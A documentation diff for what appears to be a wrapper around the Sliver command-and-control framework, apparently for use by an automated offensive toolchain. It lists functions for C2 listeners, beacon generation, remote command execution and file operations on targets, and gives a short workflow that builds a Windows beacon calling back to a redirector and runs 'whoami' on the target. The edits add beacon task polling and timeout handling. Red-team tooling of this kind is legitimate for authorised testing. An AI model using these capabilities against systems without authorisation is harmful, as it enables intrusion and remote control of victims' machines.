@@ -89,7 +89,7 @@ a live client return a structured "not connected" error until it succeeds.
 | Listeners | `start_https_listener`, `start_http_listener`, `start_mtls_listener`, `start_dns_listener`, `start_wg_listener`, `list_jobs`, `kill_job` | stand up / tear down C2 listeners across protocols |
 | Implant generation | `generate_implant`, `generate_beacon`, `list_implant_builds`, `list_implant_profiles`, `regenerate_implant` | build session implants and async beacons; reuse profiles and prior builds |
 | Sessions / beacons | `list_sessions`, `list_beacons`, `session_info`, `beacon_info`, `kill_session`, `kill_beacon` | enumerate and inspect callbacks; retire them |
-| Execution | `execute`, `execute_command` | run a binary / run a shell command on a session or beacon |
+| Execution | `execute`, `execute_command`, `get_beacon_tasks` | run a binary / run a shell command on a session or beacon; poll a beacon's queued/completed tasks |
 | File operations | `ls`, `pwd`, `cd`, `mkdir`, `download`, `upload`, `rm` | navigate and move files on the target |
 | Pivots | `list_pivots` | enumerate pivot listeners on a session |
 | Handoff | `export_handoff`, `ingest_handoff` | exchange C2 state with the rest of the stack |
@@ -121,7 +121,7 @@ connect()
 set_noise("yellow")
 start_https_listener(port=443, domain="<redirector>")
 generate_beacon(c2_host="<redirector>", os="windows", interval=60, jitter=30)
-# … deliver the beacon (payload-delivery / loader-injection-tradecraft) …
+# … deliver the beacon — see docs/delivery.md for session-safe detachment …
 poll_events()            # watch for the callback
 list_sessions()
 execute_command(target_id, "whoami")
@@ -133,6 +133,12 @@ export_handoff()         # feed C2 state back to internal-dispatch
 `execute` and the file tools accept either a **session** id (interactive, low latency) or a
 **beacon** id (asynchronous — the result returns after the next check-in, every `interval` ±
 `jitter` seconds). Use `poll_events()` to watch for new callbacks and task completion.
+
+For a beacon, if the next check-in does not arrive within `SLIVER_TASK_TIMEOUT` (default 300s),
+`execute` / `execute_command` return a structured status instead of a bare timeout error:
+`task_state="queued"` (the task is pending and will run on the next check-in, with `next_checkin`
+timing) or `task_state="dead"` (the beacon is gone). Poll `get_beacon_tasks(beacon_id)` to see
+whether a queued task has since been picked up.
 
 ---
 
